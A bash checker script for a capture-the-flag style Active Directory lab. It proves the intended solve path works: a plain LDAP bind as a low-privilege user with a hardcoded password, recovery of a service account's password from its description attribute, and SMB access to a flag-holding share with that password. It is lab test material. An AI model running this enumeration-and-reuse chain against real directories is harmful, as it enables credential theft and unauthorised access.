#!/bin/bash
# Proves the LDAP-enumeration path end to end, as a student would, driven from inside the DC:
#   1. as hodor (low-privilege), bind over a plain LDAP simple bind and read the directory,
#   2. recover svc_backup's password from its `description` attribute (the leaked secret),
#   3. confirm the nested group path svc_backup -> "IT Backup" -> "Vault Readers" is visible,
#   4. authenticate as svc_backup with the recovered password and read the vault flag,
#   5. confirm the flag matches the one the DC planted, and that hodor cannot read it.
# Exits 0 (and prints LDAP_ENUM_OK) only when every step holds, i.e. only when the directory is
# genuinely misconfigured: a readable credential in an object attribute, a nested group that
# grants a resource, and a flag gated behind that group.
set -uo pipefail

REALM="NORTH.SEVENKINGDOMS.LOCAL"
BASE_DN="DC=north,DC=sevenkingdoms,DC=local"
LDAP_URI="ldap://dc.north.sevenkingdoms.local"
HODOR_USER="hodor"
HODOR_PASS="Hodor123!"
SVC_USER="svc_backup"
NEST_GROUP="IT Backup"
VAULT_GROUP="Vault Readers"
PLANTED="/srv/vault/flag.txt"

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT

fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

# A plain (unwrapped) LDAP simple bind as hodor, exactly what ldapsearch/nxc/BloodHound do.
ldap_as_hodor() { # base filter attrs...
  local base="$1" filter="$2"; shift 2
  ldapsearch -x -LLL -o ldif-wrap=no -H "${LDAP_URI}" \
    -D "${HODOR_DN}" -w "${HODOR_PASS}" -b "${base}" "${filter}" "$@" 2>/dev/null
}

echo "[1/5] binding over LDAP as ${HODOR_USER} and enumerating the directory ..." >&2
HODOR_DN="$(samba-tool user show "${HODOR_USER}" 2>/dev/null | awk -F': ' '/^dn:/{print $2; exit}')"
[ -n "${HODOR_DN}" ] || fail "could not resolve ${HODOR_USER}'s DN"
# Sanity: the simple bind actually authenticates and returns results.
ldap_as_hodor "${BASE_DN}" "(sAMAccountName=${HODOR_USER})" dn | grep -qi "^dn:" \
  || fail "plain LDAP simple bind as ${HODOR_USER} failed (strong auth not relaxed?)"

echo "[2/5] recovering ${SVC_USER}'s password from its LDAP description ..." >&2
DESC="$(ldap_as_hodor "${BASE_DN}" "(sAMAccountName=${SVC_USER})" description \
        | sed -n 's/^description: //p' | head -n1)"
[ -n "${DESC}" ] || fail "could not read ${SVC_USER}'s description over LDAP as ${HODOR_USER}"
RECOVERED="$(printf '%s' "${DESC}" | awk '{print $NF}')"
[ -n "${RECOVERED}" ] || fail "no password token found in ${SVC_USER}'s description"
echo "      description: ${DESC}" >&2
echo "      recovered ${SVC_USER} password: ${RECOVERED}" >&2

echo "[3/5] confirming the nested group path ${SVC_USER} -> '${NEST_GROUP}' -> '${VAULT_GROUP}' ..." >&2
SVC_MEMBEROF="$(ldap_as_hodor "${BASE_DN}" "(sAMAccountName=${SVC_USER})" memberOf)"
printf '%s' "${SVC_MEMBEROF}" | grep -qi "CN=${NEST_GROUP}," \
  || fail "${SVC_USER} is not a member of '${NEST_GROUP}' in LDAP"
NEST_MEMBEROF="$(ldap_as_hodor "${BASE_DN}" "(&(objectClass=group)(cn=${NEST_GROUP}))" memberOf)"
printf '%s' "${NEST_MEMBEROF}" | grep -qi "CN=${VAULT_GROUP}," \
  || fail "'${NEST_GROUP}' is not nested in '${VAULT_GROUP}' in LDAP"

echo "[4/5] reading the vault as ${SVC_USER} with the recovered password ..." >&2
OUT="${WORK}/flag.out"
smbclient //dc/vault -U "NORTH\\${SVC_USER}%${RECOVERED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the vault share as ${SVC_USER} (nested group path not honored?)"
[ -s "${OUT}" ] || fail "vault flag.txt came back empty"

echo "[5/5] confirming the flag matches what the DC planted ..." >&2
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${SVC_USER} does not match the planted flag"

# Negative control: hodor (the foothold account) must NOT be able to read the vault.
if smbclient //dc/vault -U "NORTH\\${HODOR_USER}%${HODOR_PASS}" \
     -c "get flag.txt ${WORK}/hodor.out" >/dev/null 2>&1 && [ -s "${WORK}/hodor.out" ]; then
  fail "vault is readable by ${HODOR_USER}; the flag is not gated behind '${VAULT_GROUP}'"
fi

echo "CHECK PASS: ${HODOR_USER} -> LDAP enum -> ${SVC_USER} password (${RECOVERED}) -> nested '${VAULT_GROUP}' -> flag $(cat "${OUT}")" >&2
echo "LDAP_ENUM_OK"
